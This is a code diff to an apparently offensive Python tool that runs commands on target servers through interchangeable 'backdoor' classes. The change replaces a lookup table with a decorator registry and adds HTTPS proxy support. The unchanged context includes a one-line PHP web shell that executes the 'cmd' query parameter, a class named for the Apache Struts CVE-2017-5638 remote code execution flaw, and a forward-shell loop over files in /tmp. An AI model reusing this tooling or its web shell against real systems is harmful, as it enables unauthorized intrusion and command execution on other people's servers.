@@ -24,6 +24,14 @@ class Backdoor(metaclass=ABCMeta):
     def system(self, command):
         pass
 
+_BACKDOOR = {}
+def backdoor(name):
+    def _backdoor(clazz):
+        _BACKDOOR[name] = clazz
+        return clazz
+    return _backdoor
+
+@backdoor('local')
 class LocalBackdoor(Backdoor):
     def __init__(self, url):
         super().__init__(url)
@@ -33,6 +41,7 @@ class LocalBackdoor(Backdoor):
         proc = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         return proc.stdout
 
+@backdoor('php')
 class PhpBackdoor(Backdoor):
     """
         <?php echo system($_GET['cmd']); ?>
@@ -48,6 +57,7 @@ class PhpBackdoor(Backdoor):
 
         return text
 
+@backdoor('CVE-2017-5638')
 class CVE_2017_5638(Backdoor):
     def __init__(self, url):
         super().__init__(url)
@@ -163,15 +173,9 @@ def read_task(shell, interval=1):
         sleep(interval)
 
 if __name__ == '__main__':
-    method = {
-            'local': LocalBackdoor,
-            'php': PhpBackdoor,
-            'CVE-2017-5638': CVE_2017_5638
-    }
-
     from argparse import ArgumentParser
     parser = ArgumentParser()
-    parser.add_argument('method', help='/'.join(method))
+    parser.add_argument('backdoor', help='/'.join(_BACKDOOR))
     parser.add_argument('url')
     parser.add_argument('-i', '--inpath', default='/tmp/in')
     parser.add_argument('-o', '--outpath', default='/tmp/out')
@@ -183,8 +187,13 @@ if __name__ == '__main__':
 
     if args.proxy:
         environ['HTTP_PROXY'] = args.proxy
+        environ['HTTPS_PROXY'] = args.proxy
 
-    backdoor = method[args.method](args.url)
+    if args.backdoor in _BACKDOOR:
+        backdoor = _BACKDOOR[args.backdoor](args.url)
+    else:
+        parser.error('the following arguments are invalid: backdoor')
+
     if args.shell:
         shell = Shell(backdoor, args.inpath, args.outpath)
     else:
